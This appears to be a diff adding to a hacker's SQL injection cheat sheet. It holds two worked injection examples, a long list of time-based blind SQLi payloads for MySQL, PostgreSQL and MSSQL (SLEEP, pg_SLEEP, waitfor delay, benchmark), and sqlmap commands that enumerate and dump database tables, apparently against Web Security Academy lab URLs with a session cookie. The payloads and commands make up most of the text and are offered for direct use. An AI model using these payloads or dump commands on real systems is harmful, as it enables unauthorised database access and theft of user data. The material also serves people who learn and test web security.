@@ -144,4 +144,125 @@ https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-andwaf-bypass/
 ● OR 1=2 (False)
 !------------------------------------------------------------------------||||||||||||||||||||||||||||||||||||||||||||||||||||||--------------------------------------------!
 
+|| SQLi – Example ||
+--------------------------
+/query.php with the parameter ?name
+$sql = "SELECT email FROM users WHERE 
+firstName='$firstName'";
+/query.pp?name=martin' OR 1=1
+$sql = "SELECT email FROM users WHERE 
+firstName='martin' OR 1=1";
+!------------------------------------------------------------------------||||||||||||||||||||||||||||||||||||||||||||||||||||||||||----------------------------------------!
+
+|| SQLi – Example ||
+---------------------------
+?user_id=1338-1
+$sql = "UPDATE users SET name='test' 
+WHERE id='1338-1’”; 
+will be executed as being user id 1337
+!-------------------------------------------------------------------------|||||||||||||||||||||||||||||||||||||||||||||||||||||||||----------------------------------------!
+
+|| SQLi – Payloads ||
+-------------------------------
+SLEEP(20)#
+SLEEP(20)--
+SLEEP(20)="
+SLEEP(20)='
+'\"
+&& SLEEP(20)
+&& SLEEP(20)--
+&& SLEEP(20)#
+' AND SLEEP(20) AND '1
+'&& SLEEP(20) && '1
+ORDER BY SLEEP(20)
+ORDER BY SLEEP(20)--
+ORDER BY SLEEP(20)#
++benchmark(3200,SHA1(1))+'
++ SLEEP(10) + '
+or SLEEP(20)
+or SLEEP(20)#
+or SLEEP(20)--
+or SLEEP(20)="
+or SLEEP(20)='
+1 or SLEEP(20)#
+" or SLEEP(20)#
+' or SLEEP(20)#
+" or SLEEP(20)="
+' or SLEEP(20)='
+1) or SLEEP(20)#
+") or SLEEP(20)="
+') or SLEEP(20)='
+1)) or SLEEP(20)#
+")) or SLEEP(20)="
+')) or SLEEP(20)=
+AND (SELECT * FROM (SELECT(SLEEP(20)))AND '1'='1'
+AND (SELECT * FROM (SELECT(SLEEP(20)))AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(20)))
+AND (SELECT * FROM (SELECT(SLEEP(20)))--
+AND (SELECT * FROM (SELECT(SLEEP(20)))#
+pg_SLEEP(20)--
+or pg_SLEEP(20)
+or pg_SLEEP(20)--
+or pg_SLEEP(20)#
+1 or pg_SLEEP(20)--
+" or pg_SLEEP(20)--
+' or pg_SLEEP(20)--
+1) or pg_SLEEP(20)--
+") or pg_SLEEP(20)--
+') or pg_SLEEP(20)--
+1)) or pg_SLEEP(20)--
+")) or pg_SLEEP(20)--
+')) or pg_SLEEP(20)--
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+";waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+");waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+'));waitfor delay '0:0:5'--
+"));waitfor delay '0:0:5'--
+benchmark(10000000,MD5(1))#
+1 or benchmark(10000000,MD5(1))#
+" or benchmark(10000000,MD5(1))#
+' or benchmark(10000000,MD5(1))#
+1) or benchmark(10000000,MD5(1))#
+") or benchmark(10000000,MD5(1))#
+') or benchmark(10000000,MD5(1))#
+1)) or benchmark(10000000,MD5(1))#
+")) or benchmark(10000000,MD5(1))#
+')) or benchmark(10000000,MD5(1))#
+waitfor delay '00:00:05'
+waitfor delay '00:00:05'--
+waitfor delay '00:00:05'#
+benchmark(50000000,MD5(1))
+benchmark(50000000,MD5(1))--
+benchmark(50000000,MD5(1))#
+or benchmark(50000000,MD5(1))
+or benchmark(50000000,MD5(1))--
+or benchmark(50000000,MD5(1))#
+!-----------------------------------------------|||||||||||||||||||@@@@@@@@@@@@@@@@@@@@@@@@@@@@||||||||||||||||||||||||----------------------------------------------------!
+
+|| SQLi - sqlmap ||
+---------------------------
+sqlmap -u 'https://0a8a00b904e2f920c1e83c0e00f50087.web- security-academy.net/filter?category=Gifts' --
+cookie='session=lHoADdQGs1pHpfTCSiu5nTtyDnnQFWxv' --dbs -- level 2
+sqlmap -u 'https://0a8a00b904e2f920c1e83c0e00f50087.websecurity-academy.net/filter?category=Gifts' -- cookie='session=lHoADdQGs1pHpfTCSiu5nTtyDnnQFWxv' -- dbms=postgreSQL --dump --threads=5 --level 2
+sqlmap -u 'https://0a8a00b904e2f920c1e83c0e00f50087.websecurity-academy.net/filter?category=Gifts' -- cookie='session=lHoADdQGs1pHpfTCSiu5nTtyDnnQFWxv' -- dbms=postgreSQL -D public -T users_glgvzh --dump --level 2 
+
+|| or post parameters use: ||
+--------------------------------------
+sqlmap -r burp.txt --level 5 --risk 3 -batch -p 'sort-by'
+sqlmap -r burp.txt --level 5 --risk 3 -batch -p 'sort-by' --dump -D 
+public -T users
+
+!!!!!!!!!!!@@@@@@@@@@----------|||||||||||||||}}}}}}}}}}}}}}}}}{{{{{{{{{{<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>{{{{{{{{}}}}}}}}}}}}||||||||||||----------@@@@@@@@!!!!!!!!!!!!
+-------------------------------
+| Thanks For Visit MR.HACKER_ |
+-------------------------------
+
+
+
+
+
 
